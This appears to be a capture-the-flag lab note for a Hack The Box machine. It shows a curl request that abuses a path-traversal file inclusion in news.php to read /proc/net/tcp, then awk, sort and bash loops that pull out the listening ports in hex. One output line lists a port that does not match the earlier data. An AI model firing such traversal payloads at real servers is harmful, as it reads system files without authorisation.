#!/bin/bash
❯ curl -s -X GET http://megahosting.htb/news.php\?file\=../../../../proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000   997        0 25266 1 0000000000000000 100 0 0 10 0                     
   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 24888 1 0000000000000000 100 0 0 10 0                     
   2: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 22464 1 0000000000000000 100 0 0 10 0                     
   3: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 24309 1 0000000000000000 100 0 0 10 0                     
   4: C20A0A0A:0050 270E0A0A:D0F2 01 00000000:00000000 02:000AFC80 00000000    33        0 29537 2 0000000000000000 1057 4 30 10 -1                  
   5: C20A0A0A:836E 01010101:0035 02 00000001:00000000 01:0000030A 00000003   101        0 30399 2 0000000000000000 800 0 0 1 7
❯ curl -s -X GET http://megahosting.htb/news.php\?file\=../../../../proc/net/tcp > OpenPorts

[+]Awk
❯ bat OpenPorts | awk '{print $2}' > OpenPortsV2
00000000:1F90
00000000:0050
3500007F:0035
00000000:0016
C20A0A0A:0050
C20A0A0A:836E

❯ bat OpenPortsV2| awk '{print $2}' FS=":" > OpenPortsV3
1F90
0050
0035
0016
0050
836E

❯ bat OpenPortsV3 | sort -u > HexaPorts
1F90
0050
0035
0016
836E

[+]Bash Scripting
❯ bat HexaPorts | while read line; do echo "[+]Port $line Open[+]"; done
❯ while read line; do echo "[+]Port $line Open[+]"; done < HexaPorts

[+]Port 0016 Open[+]
[+]Port 0035 Open[+]
[+]Port 0050 Open[+]
[+]Port 1F90 Open[+]
[+]Port 831A Open[+]

- while read line = Lectura de archivo línea por línea.
- $line = Es el valor de cada linea durante la iteraccion del bucle while.

python3 hexaConverter.py >> HexaPorts
example: 0016 = Port 22 is open
